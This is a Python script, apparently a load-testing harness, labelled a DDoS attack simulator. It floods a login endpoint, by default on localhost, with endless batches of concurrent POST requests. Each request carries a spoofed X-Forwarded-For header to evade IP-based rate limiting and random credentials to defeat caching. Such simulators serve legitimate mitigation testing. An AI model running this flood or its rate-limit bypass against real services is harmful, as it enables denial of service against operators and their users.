"""
Infinite Loop DDoS Attack Simulator
(Targets the backend directly with randomized IP spoofing)
"""

import asyncio
import aiohttp
import time
import random
import sys
import os

# --- Configuration ---
TARGET_URL = os.getenv("TARGET_URL", "http://127.0.0.1:8000/api/login")

# These defaults are tuned for a localhost application-layer demo.
# They are strong enough to overwhelm the slow login path when protection is
# off, but they avoid turning the test into a raw socket/OS saturation event
# where in-app mitigation cannot visibly help.
BATCH_SIZE = int(os.getenv("DDOS_BATCH_SIZE", "20"))
WORKERS = int(os.getenv("DDOS_WORKERS", "8"))
PAUSE_BETWEEN_BATCHES_SECONDS = float(os.getenv("DDOS_BATCH_PAUSE", "0.05"))
REQUEST_TIMEOUT_SECONDS = float(os.getenv("DDOS_REQUEST_TIMEOUT", "2.0"))
SEND_FORWARDED_FOR = os.getenv("DDOS_SEND_FORWARDED_FOR", "true").strip().lower() in {
    "1", "true", "yes", "on"
}

def generate_spoofed_ip():
    """Generates a fresh private IP so the rate limiter sees a new IP."""
    return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 250)}"

async def send_batch(session: aiohttp.ClientSession, worker_id: int):
    """Sends a batch of spam requests to the backend."""
    while True:
        tasks = []
        for _ in range(BATCH_SIZE):
            ip = generate_spoofed_ip()
            headers = {"Content-Type": "application/json"}
            if SEND_FORWARDED_FOR:
                headers["X-Forwarded-For"] = ip
            # Add random garbage to the payload to bypass Exact-Match cache and AST caching if possible
            payload = {
                "username": f"admin_flood_{random.randint(1, 999999)}",
                "password": f"pwd_flood_{random.randint(1, 999999)}"
            }
            tasks.append(
                session.post(TARGET_URL, json=payload, headers=headers)
            )
        
        try:
            start = time.time()
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            latency = time.time() - start
            
            # Simple stats collection for this batch
            status_codes = {}
            for r in responses:
                if isinstance(r, Exception):
                    status_codes["Error"] = status_codes.get("Error", 0) + 1
                else:
                    status_codes[r.status] = status_codes.get(r.status, 0) + 1
                    r.release()
                    
            print(f"[Worker-{worker_id}] Sent {BATCH_SIZE} requests in {latency:.2f}s | Statuses: {status_codes}")
            if PAUSE_BETWEEN_BATCHES_SECONDS > 0:
                await asyncio.sleep(PAUSE_BETWEEN_BATCHES_SECONDS)
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[Worker-{worker_id}] Failed to send batch: {e}")

async def main():
    print("=" * 60)
    print("WARNING: INITIATING INFINITE DDOS ATTACK LOOP")
    print(f"Targeting: {TARGET_URL}")
    print(f"Workers: {WORKERS} | Batch size: {BATCH_SIZE} | Pause: {PAUSE_BETWEEN_BATCHES_SECONDS}s")
    print("=" * 60)
    print("Press Ctrl+C to stop the attack.\n")
    
    # Wait a tiny bit just in case
    await asyncio.sleep(2)
    
    # Configure connection pool for aggressive throughput
    connection_limit = max(50, WORKERS * BATCH_SIZE)
    conn = aiohttp.TCPConnector(limit=connection_limit, limit_per_host=connection_limit)
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT_SECONDS)
    session = aiohttp.ClientSession(connector=conn, timeout=timeout)
    
    workers = []
    for i in range(WORKERS):
        workers.append(asyncio.create_task(send_batch(session, i)))
        
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        print("\n[ATTACK ABORTED] Shutting down simulation...")
    except KeyboardInterrupt:
        print("\n[ATTACK ABORTED] Shutting down simulation...")
    finally:
        for w in workers:
            w.cancel()
        await session.close()
        print("Attack terminated.")

if __name__ == "__main__":
    if hasattr(asyncio, 'WindowsSelectorEventLoopPolicy'):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)
